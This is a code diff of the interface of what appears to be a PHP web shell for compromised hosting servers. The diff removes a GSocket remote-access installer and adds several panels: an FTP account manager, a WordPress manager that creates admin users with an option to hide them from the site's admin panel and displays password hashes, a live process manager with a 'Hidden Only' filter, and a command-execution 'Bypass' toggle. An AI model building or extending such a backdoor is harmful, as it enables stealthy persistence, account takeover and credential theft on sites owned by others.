+                <p style="color: var(--text-muted); font-size: 11px; font-weight: 600; margin-bottom: 10px;">Server Info</p>
+                <div style="background: var(--bg-secondary); padding: 10px; border-radius: 6px; font-size: 11px; color: var(--text-muted); font-family: monospace;">
+                    <div>Domain: <?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'N/A'); ?></div>
+                    <div>User: <?php echo htmlspecialchars(get_current_user()); ?></div>
+                    <div>Server: <?php echo htmlspecialchars(php_uname('n')); ?></div>
+                    <div>PHP: <?php echo phpversion(); ?></div>
                 </div>
-                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 14px;">
-                    <div style="font-weight: 600; color: var(--accent); margin-bottom: 8px; font-size: 13px;">Install with wget</div>
-                    <form method="POST" style="display: flex; gap: 8px;">
-                        <input type="hidden" name="gsocket_cmd" value="install_wget">
-                        <button type="submit" name="gsocket_action" class="btn btn-primary btn-sm" style="flex: 1;">Install</button>
-                    </form>
-                </div>
-                <div style="background: var(--bg-input); border: 1px solid rgba(248, 81, 73, 0.3); border-radius: 8px; padding: 14px;">
-                    <div style="font-weight: 600; color: var(--red); margin-bottom: 8px; font-size: 13px;">Uninstall GSocket</div>
-                    <div style="display: flex; gap: 8px;">
-                        <form method="POST" style="flex: 1;">
-                            <input type="hidden" name="gsocket_cmd" value="uninstall_curl">
-                            <button type="submit" name="gsocket_action" class="btn btn-danger btn-sm" style="width: 100%;">cURL</button>
-                        </form>
-                        <form method="POST" style="flex: 1;">
-                            <input type="hidden" name="gsocket_cmd" value="uninstall_wget">
-                            <button type="submit" name="gsocket_action" class="btn btn-danger btn-sm" style="width: 100%;">wget</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- FTP Manager Modal -->
+<div class="modal-overlay hidden" id="ftpModal">
+    <div class="modal" style="max-width: 620px;">
+        <div class="modal-header">
+            <span class="modal-title" style="color: #f97316;">FTP Manager</span>
+            <button class="modal-close" onclick="hideModal('ftp')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <div class="modal-body">
+            <!-- Add FTP -->
+            <div style="background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 16px;">
+                <p style="color: var(--gold); font-size: 12px; font-weight: 600; margin-bottom: 10px;">Add FTP Account</p>
+                <form method="POST">
+                    <div style="display: grid; grid-template-columns: 1fr 1fr 80px; gap: 8px; align-items: end;">
+                        <div class="form-group" style="margin: 0;">
+                            <label class="form-label">Username</label>
+                            <input type="text" name="ftp_user" class="form-input" placeholder="ftpuser" required>
+                        </div>
+                        <div class="form-group" style="margin: 0;">
+                            <label class="form-label">Password</label>
+                            <input type="text" name="ftp_pass" class="form-input" placeholder="P@ss123!" required>
+                        </div>
+                        <button type="submit" name="ftp_add" class="btn btn-primary btn-sm" style="height: 36px;">Add</button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- List + Actions -->
+            <div style="margin-bottom: 10px;">
+                <p style="color: var(--text-primary); font-size: 12px; font-weight: 600;">FTP Accounts</p>
+            </div>
+
+            <?php if (!empty($ftpAccounts)): ?>
+            <div style="max-height: 300px; overflow-y: auto;">
+            <?php foreach ($ftpAccounts as $i => $ftp):
+                $ftpLogin = $ftp['login'] ?? $ftp['user'] ?? '';
+                $ftpDomain = $ftp['domain'] ?? '';
+                $ftpDir = $ftp['homedir'] ?? '';
+                $ftpAtSign = strpos($ftpLogin, '@');
+                $ftpUserOnly = ($ftpAtSign !== false) ? substr($ftpLogin, 0, $ftpAtSign) : $ftpLogin;
+                if (empty($ftpDomain) && $ftpAtSign !== false) $ftpDomain = substr($ftpLogin, $ftpAtSign + 1);
+            ?>
+            <div style="background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; padding: 10px; margin-bottom: 6px;">
+                <div style="display: flex; justify-content: space-between; align-items: center; gap: 8px; flex-wrap: wrap;">
+                    <div style="flex: 1; min-width: 180px;">
+                        <div style="color: var(--accent); font-size: 12px; font-weight: 600; font-family: monospace;"><?php echo htmlspecialchars($ftpLogin); ?></div>
+                        <div style="color: var(--text-muted); font-size: 10px;"><?php echo htmlspecialchars($ftpDir); ?></div>
+                    </div>
+                    <div style="display: flex; gap: 4px; align-items: center;">
+                        <button type="button" class="btn btn-sm btn-secondary" style="padding: 3px 8px; font-size: 10px;" onclick="ftpChgPass('<?php echo htmlspecialchars($ftpUserOnly, ENT_QUOTES); ?>','<?php echo htmlspecialchars($ftpDomain, ENT_QUOTES); ?>')">ChgPass</button>
+                        <form method="POST" style="margin:0;" onsubmit="return confirm('Delete <?php echo htmlspecialchars($ftpLogin, ENT_QUOTES); ?>?')">
+                            <input type="hidden" name="ftp_del_user" value="<?php echo htmlspecialchars($ftpUserOnly); ?>">
+                            <input type="hidden" name="ftp_del_domain" value="<?php echo htmlspecialchars($ftpDomain); ?>">
+                            <button type="submit" name="ftp_delete" class="btn btn-sm btn-danger" style="padding: 3px 8px; font-size: 10px;">Del</button>
                         </form>
                     </div>
                 </div>
+                <!-- Inline change password (hidden by default) -->
+                <div id="ftpChg_<?php echo $i; ?>" class="hidden" style="margin-top: 8px; padding-top: 8px; border-top: 1px solid var(--border);">
+                    <form method="POST" style="display: flex; gap: 6px; align-items: end;">
+                        <input type="hidden" name="ftp_chg_user" value="<?php echo htmlspecialchars($ftpUserOnly); ?>">
+                        <input type="hidden" name="ftp_chg_domain" value="<?php echo htmlspecialchars($ftpDomain); ?>">
+                        <div style="flex: 1;">
+                            <label class="form-label" style="font-size: 10px;">New Password</label>
+                            <input type="text" name="ftp_chg_pass" class="form-input" style="font-size: 11px; padding: 6px 8px;" placeholder="NewP@ss!" required>
+                        </div>
+                        <button type="submit" name="ftp_passwd" class="btn btn-primary btn-sm" style="height: 32px; font-size: 10px;">Save</button>
+                    </form>
+                </div>
             </div>
-        </div>
-        </div>
-        <div class="modal-footer">
-            <button type="button" class="btn btn-secondary" onclick="hideModal('gsocket')">Close</button>
+            <?php endforeach; ?>
+            </div>
+            <?php else: ?>
+            <div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 11px;">
+                No FTP accounts found.
+            </div>
+            <?php endif; ?>
         </div>
     </div>
 </div>
 
-<div class="modal-overlay hidden" id="ftpModal">
-    <div class="modal" style="max-width: 550px;">
+<!-- WordPress Manager Modal -->
+<?php if ($wpAvailable): ?>
+<div class="modal-overlay hidden" id="wpModal">
+    <div class="modal" style="max-width: 820px; max-height: 90vh; overflow-y: auto;">
         <div class="modal-header">
-            <span class="modal-title">FTP Manager</span>
-            <button class="modal-close" onclick="hideModal('ftp')">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <line x1="18" y1="6" x2="6" y2="18"/>
-                    <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-            </button>
+            <span class="modal-title" style="color: #3b82f6;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/></svg>
+                WordPress Manager
+            </span>
+            <button class="modal-close" onclick="hideModal('wp')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
         <div class="modal-body">
-            <div style="display: flex; flex-direction: column; gap: 12px;">
-                
-                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 12px;">
-                    <div style="font-weight: 600; color: var(--accent); margin-bottom: 8px; font-size: 12px;">List FTP Accounts</div>
-                    <form method="POST">
-                        <button type="submit" name="ftp_list" class="btn btn-primary btn-sm" style="width: 100%;">Show All FTP</button>
-                    </form>
+            <!-- Create Admin -->
+            <div style="background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 16px;">
+                <p style="color: #3fb950; font-size: 12px; font-weight: 600; margin-bottom: 10px;">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg>
+                    Create Admin User
+                </p>
+                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 8px;">
+                    <div class="form-group" style="margin: 0;">
+                        <label class="form-label">Username</label>
+                        <input type="text" id="wpNewUser" class="form-input" placeholder="admin_user">
+                    </div>
+                    <div class="form-group" style="margin: 0;">
+                        <label class="form-label">Password</label>
+                        <input type="text" id="wpNewPass" class="form-input" placeholder="P@ssw0rd!">
+                    </div>
+                    <div class="form-group" style="margin: 0;">
+                        <label class="form-label">Email (optional)</label>
+                        <input type="text" id="wpNewEmail" class="form-input" placeholder="user@domain.com">
+                    </div>
                 </div>
-                
-                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 12px;">
-                    <div style="font-weight: 600; color: var(--gold); margin-bottom: 8px; font-size: 12px;">Add FTP Account (homedir auto-detect)</div>
-                    <form method="POST">
-                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px;">
-                            <input type="text" name="ftp_user" class="form-input" placeholder="Username" required style="font-size: 11px; padding: 6px 8px;">
-                            <input type="text" name="ftp_pass" class="form-input" placeholder="Password" required style="font-size: 11px; padding: 6px 8px;">
-                        </div>
-                        <div style="display: flex; gap: 6px;">
-                            <input type="text" name="ftp_quota" class="form-input" placeholder="Quota (0=unlimited)" style="font-size: 11px; padding: 6px 8px; width: 140px;">
-                            <button type="submit" name="ftp_add" class="btn btn-primary btn-sm" style="flex: 1;">Create FTP</button>
-                        </div>
-                    </form>
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <label style="display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--text-muted); cursor: pointer; margin: 0;">
+                        <input type="checkbox" id="wpHideUser" style="width: auto; accent-color: #7c3aed;">
+                        Hide user from WP admin panel
+                    </label>
+                    <button type="button" class="btn btn-sm btn-primary" onclick="wpCreateAdmin()" style="margin-left: auto; padding: 6px 16px;">Create</button>
                 </div>
-                
-                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 12px;">
-                    <div style="font-weight: 600; color: var(--purple); margin-bottom: 8px; font-size: 12px;">Change FTP Password</div>
-                    <form method="POST">
-                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px;">
-                            <input type="text" name="ftp_chg_user" class="form-input" placeholder="Username" required style="font-size: 11px; padding: 6px 8px;">
-                            <input type="text" name="ftp_chg_domain" class="form-input" placeholder="Domain (e.g. domain.com)" required style="font-size: 11px; padding: 6px 8px;">
-                        </div>
-                        <div style="display: flex; gap: 6px;">
-                            <input type="text" name="ftp_chg_pass" class="form-input" placeholder="New Password" required style="font-size: 11px; padding: 6px 8px; flex: 1;">
-                            <button type="submit" name="ftp_passwd" class="btn btn-gsocket btn-sm">Change</button>
-                        </div>
-                    </form>
-                </div>
-                
-                <div style="background: var(--bg-input); border: 1px solid rgba(248, 81, 73, 0.3); border-radius: 8px; padding: 12px;">
-                    <div style="font-weight: 600; color: var(--red); margin-bottom: 8px; font-size: 12px;">Delete FTP Account</div>
-                    <form method="POST">
-                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-bottom: 8px;">
-                            <input type="text" name="ftp_del_user" class="form-input" placeholder="Username" required style="font-size: 11px; padding: 6px 8px;">
-                            <input type="text" name="ftp_del_domain" class="form-input" placeholder="Domain (e.g. domain.com)" required style="font-size: 11px; padding: 6px 8px;">
-                        </div>
-                        <button type="submit" name="ftp_delete" class="btn btn-danger btn-sm" style="width: 100%;">Delete FTP</button>
-                    </form>
-                </div>
-                
+                <div id="wpCreateStatus" style="display: none; margin-top: 8px; padding: 8px 12px; border-radius: 6px; font-size: 11px;"></div>
             </div>
-        </div>
-        <div class="modal-footer">
-            <button type="button" class="btn btn-secondary" onclick="hideModal('ftp')">Close</button>
+
+            <!-- User List -->
+            <div style="margin-bottom: 10px;">
+                <p style="color: var(--text-primary); font-size: 12px; font-weight: 600;">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+                    WordPress Users
+                </p>
+            </div>
+
+            <div id="wpUserList" style="max-height: 400px; overflow-y: auto;">
+                <div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 11px;">Loading...</div>
+            </div>
         </div>
     </div>
 </div>
 
-<div class="modal-overlay hidden" id="deleteConfirmModal">
+<!-- WP Delete Confirm Modal -->
+<div class="modal-overlay hidden" id="wpDeleteModal" style="z-index: 1001;">
     <div class="modal" style="max-width: 400px;">
-        <div class="modal-header" style="border-bottom-color: rgba(248, 81, 73, 0.3);">
-            <span class="modal-title" style="color: var(--red);">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline-block; vertical-align: middle; margin-right: 6px;">
-                    <path d="M3 6h18"/>
-                    <path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/>
-                    <path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/>
-                    <line x1="10" y1="11" x2="10" y2="17"/>
-                    <line x1="14" y1="11" x2="14" y2="17"/>
-                </svg>
-                Delete Confirmation
-            </span>
-            <button class="modal-close" onclick="hideDeleteConfirm()">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <line x1="18" y1="6" x2="6" y2="18"/>
-                    <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-            </button>
+        <div class="modal-header">
+            <span class="modal-title" style="color: #f85149;">Confirm Delete</span>
+            <button class="modal-close" onclick="hideModal('wpDelete')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
-        <div class="modal-body" style="text-align: center; padding: 24px;">
-            <div style="width: 60px; height: 60px; background: rgba(248, 81, 73, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
-                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2">
-                    <circle cx="12" cy="12" r="10"/>
-                    <line x1="12" y1="8" x2="12" y2="12"/>
-                    <line x1="12" y1="16" x2="12.01" y2="16"/>
-                </svg>
+        <div class="modal-body">
+            <p style="color: var(--text-muted); font-size: 12px;">Delete user <strong id="wpDeleteName" style="color: #f85149;"></strong>? This cannot be undone.</p>
+            <div style="display: flex; gap: 8px; margin-top: 14px; justify-content: flex-end;">
+                <button class="btn btn-sm btn-secondary" onclick="hideModal('wpDelete')">Cancel</button>
+                <button class="btn btn-sm btn-danger" id="wpDeleteConfirmBtn" onclick="wpConfirmDelete()">Delete</button>
             </div>
-            <p style="color: var(--text); font-size: 14px; margin-bottom: 8px;">Are you sure you want to delete?</p>
-            <p id="deleteFileName" style="color: var(--gold); font-size: 13px; font-weight: 600; word-break: break-all;"></p>
-            <p style="color: var(--text-muted); font-size: 11px; margin-top: 12px;">This action cannot be undone.</p>
         </div>
-        <div class="modal-footer" style="justify-content: center; gap: 12px;">
-            <button type="button" class="btn btn-secondary" onclick="hideDeleteConfirm()">Cancel</button>
-            <a id="deleteConfirmBtn" href="#" class="btn btn-danger" style="background: var(--red); border-color: var(--red); color: white;">Delete</a>
+    </div>
+</div>
+<?php endif; ?>
+
+<!-- Process Manager Modal -->
+<div class="modal-overlay hidden" id="procModal">
+    <div class="modal" style="max-width: 1100px; max-height: 92vh; overflow: hidden; display: flex; flex-direction: column;">
+        <div class="modal-header" style="flex-shrink: 0;">
+            <span class="modal-title" style="color: #ec4899;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg>
+                Process Manager
+                <span id="procLiveIndicator" style="display:inline-block;width:8px;height:8px;background:#3fb950;border-radius:50%;margin-left:8px;animation:procPulse 1s infinite;vertical-align:middle;"></span>
+                <span style="font-size:10px;color:#3fb950;margin-left:4px;font-weight:400;">LIVE</span>
+            </span>
+            <div style="display:flex;align-items:center;gap:8px;">
+                <span id="procStats" style="font-size:10px;color:var(--text-muted);"></span>
+                <button class="btn btn-sm btn-secondary" onclick="procTogglePause()" id="procPauseBtn" style="padding:3px 10px;font-size:10px;">Pause</button>
+                <button class="modal-close" onclick="procStopAndClose()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+            </div>
+        </div>
+        <div class="modal-body" style="flex: 1; overflow: hidden; display: flex; flex-direction: column; padding: 10px 14px;">
+            <!-- Filter + Search -->
+            <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;align-items:center;">
+                <input type="text" id="procSearch" class="form-input" placeholder="Search process..." style="flex:1;min-width:150px;padding:5px 10px;font-size:11px;" oninput="procFilterRender()">
+                <select id="procFilter" class="form-input" style="width:auto;padding:5px 8px;font-size:11px;" onchange="procFilterRender()">
+                    <option value="all">All Processes</option>
+                    <option value="mine">My Processes</option>
+                    <option value="hidden">Hidden Only</option>
+                    <option value="recent">Recent (5min)</option>
+                </select>
+                <select id="procSort" class="form-input" style="width:auto;padding:5px 8px;font-size:11px;" onchange="procFilterRender()">
+                    <option value="cpu">Sort: CPU</option>
+                    <option value="mem">Sort: MEM</option>
+                    <option value="pid">Sort: PID</option>
+                    <option value="start">Sort: Start</option>
+                </select>
+            </div>
+
+            <!-- Alert badges -->
+            <div id="procAlerts" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;"></div>
+
+            <!-- Process table -->
+            <div style="flex:1;overflow:auto;border:1px solid var(--border);border-radius:6px;">
+                <table style="width:100%;border-collapse:collapse;font-size:11px;">
+                    <thead>
+                        <tr style="background:var(--bg-secondary);position:sticky;top:0;z-index:1;">
+                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">PID</th>
+                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">USER</th>
+                            <th style="padding:6px 8px;text-align:right;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">CPU%</th>
+                            <th style="padding:6px 8px;text-align:right;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">MEM%</th>
+                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">STAT</th>
+                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">START</th>
+                            <th style="padding:6px 8px;text-align:left;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);">COMMAND</th>
+                            <th style="padding:6px 8px;text-align:center;color:var(--text-muted);font-weight:600;border-bottom:1px solid var(--border);white-space:nowrap;">ACTION</th>
+                        </tr>
+                    </thead>
+                    <tbody id="procTableBody">
+                        <tr><td colspan="8" style="text-align:center;padding:30px;color:var(--text-muted);">Loading...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+<style>
+@keyframes procPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+.proc-row:hover { background: rgba(236,72,153,0.06) !important; }
+.proc-hidden { border-left: 3px solid #f85149 !important; background: rgba(248,81,73,0.06) !important; }
+.proc-recent { border-left: 3px solid #3fb950 !important; background: rgba(63,185,80,0.06) !important; }
+.proc-high-cpu { color: #f85149 !important; font-weight: 700; }
+.proc-high-mem { color: #f97316 !important; font-weight: 700; }
+</style>
+
+<!-- Process Kill Confirm -->
+<div class="modal-overlay hidden" id="procKillModal" style="z-index: 1001;">
+    <div class="modal" style="max-width: 380px;">
+        <div class="modal-header">
+            <span class="modal-title" style="color: #f85149;">Kill Process</span>
+            <button class="modal-close" onclick="hideModal('procKill')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <div class="modal-body">
+            <p style="color:var(--text-muted);font-size:12px;">Kill PID <strong id="procKillPid" style="color:#f85149;"></strong>?</p>
+            <p id="procKillCmd" style="color:var(--text-muted);font-size:10px;font-family:monospace;word-break:break-all;margin-top:4px;"></p>
+            <div style="display:flex;gap:6px;margin-top:12px;justify-content:flex-end;">
+                <button class="btn btn-sm btn-secondary" onclick="hideModal('procKill')">Cancel</button>
+                <button class="btn btn-sm" style="background:#f97316;border-color:#f97316;color:#fff;" onclick="procDoKill('15')">SIGTERM</button>
+                <button class="btn btn-sm btn-danger" onclick="procDoKill('9')">SIGKILL</button>
+            </div>
         </div>
     </div>
 </div>
 
 <script>
-var deleteTargetPath = '';
-
-function showDeleteConfirm(path, name) {
-    deleteTargetPath = path;
-    document.getElementById('deleteFileName').textContent = decodeURIComponent(name);
-    document.getElementById('deleteConfirmBtn').href = '?delete=' + path;
-    document.getElementById('deleteConfirmModal').classList.remove('hidden');
-}
-
-function hideDeleteConfirm() {
-    document.getElementById('deleteConfirmModal').classList.add('hidden');
-}
-
 function showModal(type) {
     document.getElementById(type + 'Modal').classList.remove('hidden');
+    if (type === 'wp' && typeof wpLoadUsers === 'function') wpLoadUsers();
+    if (type === 'ftp') ftpAutoLoad();
+    if (type === 'proc') procStart();
 }
-function hideModal(type) {
-    document.getElementById(type + 'Modal').classList.add('hidden');
+function hideModal(type) { document.getElementById(type + 'Modal').classList.add('hidden'); }
+
+var ftpLoaded = <?php echo (!empty($ftpAccounts) || isset($_POST['ftp_list'])) ? 'true' : 'false'; ?>;
+function ftpAutoLoad() {
+    if (ftpLoaded) return;
+    ftpLoaded = true;
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.style.display = 'none';
+    var inp = document.createElement('input');
+    inp.type = 'hidden';
+    inp.name = 'ftp_list';
+    inp.value = '1';
+    form.appendChild(inp);
+    document.body.appendChild(form);
+    form.submit();
 }
 
+var bypassMode = false;
+function toggleBypass() {
+    bypassMode = !bypassMode;
+    var btn = document.getElementById('bypassToggle');
+    var field = document.getElementById('useBypassField');
+    var label = document.getElementById('cmdModeLabel');
+    if (bypassMode) {
+        btn.textContent = 'Bypass';
+        btn.className = 'btn btn-sm btn-danger';
+        btn.style.cssText = 'padding:4px 8px;font-size:10px;min-width:52px;background:#f85149;border-color:#f85149;color:#fff;';
+        field.value = '1';
+        label.textContent = '#';
+        label.style.color = '#f85149';
+    } else {
+        btn.textContent = 'Normal';
+        btn.className = 'btn btn-sm btn-secondary';
+        btn.style.cssText = 'padding:4px 8px;font-size:10px;min-width:52px;';
+        field.value = '0';
+        label.textContent = '$';
+        label.style.color = '';
+    }
+}
+
+function ftpChgPass(user, domain) {
+    var panels = document.querySelectorAll('[id^="ftpChg_"]');
+    panels.forEach(function(p) { p.classList.add('hidden'); });
+    for (var i = 0; i < 100; i++) {
+        var el = document.getElementById('ftpChg_' + i);
+        if (!el) break;
+        var form = el.querySelector('form');
+        if (form) {
+            var uInput = form.querySelector('[name="ftp_chg_user"]');
+            var dInput = form.querySelector('[name="ftp_chg_domain"]');
+            if (uInput && dInput && uInput.value === user && dInput.value === domain) {
+                el.classList.toggle('hidden');
+                if (!el.classList.contains('hidden')) {
+                    el.querySelector('[name="ftp_chg_pass"]').focus();
+                }
+                break;
+            }
+        }
+    }
+}
+
+function showDeleteConfirm(path, name) {
+    document.getElementById('deleteFileName').textContent = decodeURIComponent(name);
+    document.getElementById('deleteConfirmBtn').href = '?del=' + path + '';
+    document.getElementById('deleteConfirmModal').classList.remove('hidden');
+}
+function hideDeleteConfirm() { document.getElementById('deleteConfirmModal').classList.add('hidden'); }
+
 function addUploader() {
-    var container = document.getElementById('uploadersContainer');
-    var row = document.createElement('div');
-    row.className = 'uploader-row';
-    row.innerHTML = '<label class="custom-file-input"><input type="file" name="files[]" onchange="updateFileName(this)"><span class="file-btn"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>Choose File</span><span class="file-name">No file selected</span></label><button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)" style="padding: 6px 10px;">X</button>';
-    container.appendChild(row);
+    var c = document.getElementById('uploadersContainer');
+    var r = document.createElement('div');
+    r.className = 'uploader-row';
+    r.innerHTML = '<label class="custom-file-input"><input type="file" name="files[]" onchange="updateFileName(this)"><span class="file-btn">Choose File</span><span class="file-name">No file selected</span></label><button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)">X</button>';
+    c.appendChild(r);
 }
 
 function removeUploader(btn) {
-    var container = document.getElementById('uploadersContainer');
-    if (container.children.length > 1) {
-        btn.parentElement.remove();
-    }
+    var c = document.getElementById('uploadersContainer');
+    if (c.children.length > 1) btn.parentElement.remove();
 }
 
 function updateFileName(input) {
     var label = input.closest('.custom-file-input');
     var nameSpan = label.querySelector('.file-name');
-    if (input.files.length > 0) {
-        nameSpan.textContent = input.files[0].name;
-        label.classList.add('has-file');
-    } else {
-        nameSpan.textContent = 'No file selected';
-        label.classList.remove('has-file');
-    }
+    if (input.files.length > 0) { nameSpan.textContent = input.files[0].name; label.classList.add('has-file'); }
+    else { nameSpan.textContent = 'No file selected'; label.classList.remove('has-file'); }
 }
 
 document.querySelectorAll('.modal-overlay').forEach(function(overlay) {
     overlay.addEventListener('click', function(e) {
-        if (e.target === overlay) {
-            overlay.classList.add('hidden');
-        }
+        if (e.target === overlay) overlay.classList.add('hidden');
     });
 });
+
+<?php if (!empty($ftpAccounts) || isset($_POST['ftp_list']) || isset($_POST['ftp_add']) || isset($_POST['ftp_passwd']) || isset($_POST['ftp_delete'])): ?>
+showModal('ftp');
+<?php endif; ?>
+
+// === WordPress Manager Functions ===
+function wpRequest(data, callback) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', window.location.href, true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        try {
+            var response = JSON.parse(xhr.responseText);
+            callback(response);
+        } catch(e) {
+            callback({err: xhr.responseText.substring(0, 300)});
+        }
+    };
+    xhr.onerror = function() { callback({err: 'Network error'}); };
+    var params = [];
+    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
+    xhr.send(params.join('&'));
+}
+
+function wpLoadUsers() {
+    var container = document.getElementById('wpUserList');
+    if (!container) return;
+    container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">Loading users...</div>';
+    wpRequest({c4t: 'ulst'}, function(users) {
+        if (users.err) {
+            container.innerHTML = '<div style="text-align:center;padding:20px;color:#f85149;font-size:11px;">Error: ' + users.err + '</div>';
+            return;
+        }
+        if (!users.length) {
+            container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No users found.</div>';
+            return;
+        }
+        var html = '';
+        users.forEach(function(u) {
+            var isHidden = u.is_hidden || false;
+            var hiddenBadge = isHidden ? '<span style="background:#7c3aed;color:white;padding:1px 6px;border-radius:3px;font-size:9px;font-weight:600;margin-left:6px;">HIDDEN</span>' : '';
+            var borderLeft = isHidden ? 'border-left: 3px solid #7c3aed;' : '';
+            var bgColor = isHidden ? 'background: rgba(124,58,237,0.08);' : 'background: var(--bg-secondary);';
+            html += '<div style="' + bgColor + borderLeft + 'border: 1px solid var(--border); border-radius: 6px; padding: 10px; margin-bottom: 6px;">';
+            html += '<div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;">';
+            html += '<div style="flex:1;min-width:200px;">';
+            html += '<div style="display:flex;align-items:center;gap:6px;">';
+            html += '<span style="color:#3b82f6;font-size:10px;font-weight:600;font-family:monospace;">#' + u.ID + '</span>';
+            html += '<span style="color:var(--accent);font-size:12px;font-weight:600;">' + u.user_login + '</span>';
+            html += hiddenBadge;
+            html += '</div>';
+            html += '<div style="color:var(--text-muted);font-size:10px;">' + u.user_email + '</div>';
+            html += '<div style="color:var(--text-muted);font-size:9px;font-family:monospace;word-break:break-all;max-width:280px;opacity:0.6;">' + u.user_pass.substring(0, 34) + '...</div>';
+            html += '</div>';
+            html += '<div style="display:flex;gap:4px;align-items:center;flex-wrap:wrap;">';
+            html += '<button class="btn btn-sm btn-danger" style="padding:3px 8px;font-size:10px;" onclick="wpResetPw(' + u.ID + ',this)">ResetPW</button>';
